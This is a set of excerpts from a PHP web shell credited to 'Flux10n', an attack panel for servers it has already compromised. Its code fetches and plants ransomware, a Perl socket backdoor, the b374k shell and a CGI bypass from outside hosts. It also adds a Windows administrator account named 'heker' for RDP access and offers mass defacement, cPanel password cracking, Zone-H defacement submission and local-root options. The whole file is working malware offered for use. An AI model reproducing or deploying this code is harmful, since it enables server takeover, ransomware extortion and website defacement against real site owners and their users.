...
<Variable name="themeColor" description="Address bar color" type="color" default="lime" value="lime"/></Group>
...
.textarea {transition: all 0.1s; outline: none;border: 1px solid #ffffff;width: 100%;height: 400px;padding-left: 5px;margin: 10px auto;resize: none;background: transparent;color: #ffffff;font-family: 'Abel';font-size: 13px;}
...
function getfile($name) {
	...
	if($name === "adminer") $get = array("https://raw.githubusercontent.com/flux10n/AdminerDB/main/adminer-4.8.1.php", "adminer.php");
	elseif($name === "webconsole") $get = array("https://raw.githubusercontent.com/flux10n/webconsole/main/webconsole.php", "webconsole.php");
	elseif($name === "rans") $get = array("https://raw.githubusercontent.com/flux10n/RANSOMWEB/main/ex.php", "rans.php");
	elseif($name === "soc") $get = array("https://raw.githubusercontent.com/flux10n/RANSOMWEB/main/soc.pl", "soc.pl");
	elseif($name === "b374k") $get = array("https://raw.githubusercontent.com/b374k/b374k/master/index.php", "b374k.php");
    ...
    elseif($name === "func") $get = array("https://git.linuxsec.org/sh.txt", "zing/func.php");
...
function tools($toolsname, $args = null) {
	...
	elseif($toolsname === "spawn") {
      ...
      elseif($args === "rans") {
          if(file_exists("rans.php")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/rans.php' frameborder='0' scrolling='yes'></iframe>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'Ransomware'."));
				if(getfile("rans")) {
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/rans.php' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
					print color(1, 1, "Error while downloading file Ransomware.");
					@unlink("rans.php");
				}
			}
        }
     elseif($args === "soc") {
         if(file_exists("soc.pl")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/soc.pl' frameborder='0' scrolling='yes'></iframe>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'Socket Perl'."));
				if(getfile("soc")) {
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/soc.pl' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
					print color(1, 1, "Error while downloading file Socket Perl.");
					@unlink("soc.pl");
				}
			}
        }
      elseif($args === "b374k") {
         if(file_exists("b374k.php")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/b374k.php' frameborder='0' scrolling='yes'></iframe>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'b374k'."));
				if(getfile("b374k")) {
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/b374k.php' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
					print color(1, 1, "Error while downloading file b374k.");
					@unlink("b374k.php");
				}
			}
        }
      elseif($args === "fm") {
         if(file_exists("fm.php")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/fm.php' frameborder='0' scrolling='yes'></iframe>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create 'Filemanager'."));
				if(getfile("fm")) {
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/fm.php' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
					print color(1, 1, "Error while downloading Filemanager.");
					@unlink("fm.php");
				}
			}
        }
		...
		elseif($args === "cgipy") {
			if(file_exists("idx_cgi/cgipy.idx")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgipy.idx' frameborder='0' scrolling='yes'></iframe>";
			}
			elseif(file_exists('cgipy.idx')) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/cgipy.idx' frameborder='0' scrolling='yes'></iframe>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_cgi'."));
				if(!is_dir(path()."/idx_cgi/")) {
				...
				if(getfile("cgipy")) {
					chmod('idx_cgi/cgipy.idx', 0755);
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgipy.idx' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
					print color(1, 1, "Error while downloading file CGI Python.");
					@rmdir(path()."/idx_cgi/");
					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Linux") @exe("rm -rf ".path()."/idx_cgi/");
					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Windows") @exe("rmdir /s /q ".path()."/idx_cgi/");
				}
	...
	elseif($args === "acs") {
			if(file_exists("zamn/acs.py")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/zamn/acs.py' frameborder='0' scrolling='yes'></iframe>";
			}
			elseif(file_exists('acs.py')) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/acs.py' frameborder='0' scrolling='yes'></iframe>";
			}
			else {
				...
				if(getfile("acs")) {
					...
					print color(1, 1, "Error while downloading file Create Shell.");
					@rmdir(path()."/zamn/");
					if(!@rmdir(path()."/zamn/") AND OS() === "Linux") @exe("rm -rf ".path()."/zamn/");
					if(!@rmdir(path()."/zamn/") AND OS() === "Windows") @exe("rmdir /s /q ".path()."/zamn/");
				}
			}
	
		}
        elseif($args === "func") {
            if(file_exists("zing/func.php")) {
                print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/zing/func.php' frameborder='0' scrolling='yes'></iframe>";
            }
            elseif(file_exists('func.php')) {
                print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/func.php' frameborder='0' scrolling='yes'></iframe>";
            }
            else {
                if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'zing'."));
                if(!is_dir(path()."/zing/")) {
                    @mkdir('zing', 0755);
                    save("zing/.htaccess", "w", "Options all DirectoryIndex Sux.html AddType text/plain .php AddType application/x-httpd-cgi .pl AddHandler server-parsed .php AddHandler cgi-script .pl AddHandler cgi-script .pl");
                }
                if(getfile("func")) {
                    ...
                    print color(1, 1, "Error while downloading file Bypass CGI.");
                    @rmdir(path()."/zing/");
                    if(!@rmdir(path()."/zing/") AND OS() === "Linux") @exe("rm -rf ".path()."/zing/");
                    if(!@rmdir(path()."/zing/") AND OS() === "Windows") @exe("rmdir /s /q ".path()."/zing/");
                }
            }
	...
	elseif($toolsname === "krdp") {
		...
		if(preg_match("/heker/", exe("net user"))) die(color(1, 1, "[INFO] username 'heker' already exists."));

		$add_user   = exe("net user heker heker /add");
    	$add_groups1 = exe("net localgroup Administrators heker /add");
    	$add_groups2 = exe("net localgroup Administrator heker /add");
    	$add_groups3 = exe("net localgroup Administrateur heker /add");

    	print "[ RDP ACCOUNT INFO ]<br>
    	------------------------------<br>
    	IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
    	Username: ".color(1, 2, "heker")."<br>
    	Password: ".color(1, 2, "heker")."<br>
    	------------------------------<br><br>
    	[ STATUS ]<br>
    	------------------------------<br>
    	";
...
function files_and_folder() {
	...
	print "</table>";
	print "<br><center>Copyright &copy; ".date("Y")." - <a href='https://github.com/flux10n' target='_blank'>".color(1, 2, "Flux10n")."</a></center>";
}
...
function action() {
	...
	print "<li>[ <a href='?dir=".path()."&do=mass'>Mass Deface</a> ]</li>";
	print "<li>[ <a href='?dir=".path()."&do=LRE'>Local Root</a> ]</li>";
	print "<li>[ <a href='?dir=".path()."&do=zoneh'>Zone-H Archive</a> ]</li>";
	print "</ul>";
	print "</center>";
	print "<hr style='margin-top: 15px; margin-bottom: 10px;'>";
	...
	if(isset($_GET['do'])) {
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='Flux10n'><br><br>
		    	       Domains: <br>
		    	       <textarea class='textarea' style='width: 450px; height: 150px;' name='url' placeholder='http://google.com/'></textarea><br>
		...
		elseif($_GET['do'] == 'cpanel') {
			if($_POST['crack']) {
				...
				print "<center>
					   ...
					   <form method='post'>
					   USER: <br>
					   <textarea class='textarea' style='width: 450px; height: 150px;' name='user_cp'>";
				print implode("\n", getuser());
				print "</textarea><br>
					   PASS: <br>
					   <span>Grab Password from Link Config:</span><br>
					   <input style='width: 415px; background: transparent; border: 1px solid #ffffff; color: #ffffff;' type='text' name='linkpass' placeholder='http://web.com/idx_config/'>
					   <input style='background: transparent; border: 1px solid #ffffff; color: #ffffff;' type='submit' name='submitlink' value='&nbsp;>>&nbsp;'>
					   <br>
					   <textarea class='textarea' style='width: 450px; height: 200px;' name='pass_cp'>";
		...
		elseif($_GET['do'] == 'mpc') {
			if($_POST['hajar']) {
				...
				Set User & Pass: <br>
				<input type='text' name='user_baru' value='heker' placeholder='user_baru'><br>
				<input type='text' name='pass_baru' value='heker' placeholder='pass_baru'><br>
		...
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea class='textarea' name='script' style='width: 450px; height: 200px;'>Hacked by Flux10n</textarea><br>
		...
		elseif($_GET['do'] == 'fakeroot') {
			...
			if($_POST['reverse']) {
				...
				Domain: <br>
				<textarea class='textarea' style='width: 450px; height: 250px;' name='url'>";
				print implode("\n", reverse());
				print "</textarea><br>
				<font style='text-decoration: underline;'>Index File:</font><br>
				<textarea class='textarea' name='script' style='width: 450px; height: 200px;'>Hacked by Flux10n</textarea><br>
	...
	elseif(isset($_GET['act'])) {
		...
		elseif($_GET['act'] === 'view') {
			...
			print "<textarea class='textarea' readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
		} 
		elseif($_GET['act'] === 'edit') {
			...
			print "<form method='post'>
			<textarea class='textarea' class='textarea' name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
			<center><input type='submit' class='input' value='SAVE' name='save' style='text-align:center;justify-content:center;width: 500px;'>
			</form></center>";
		} 
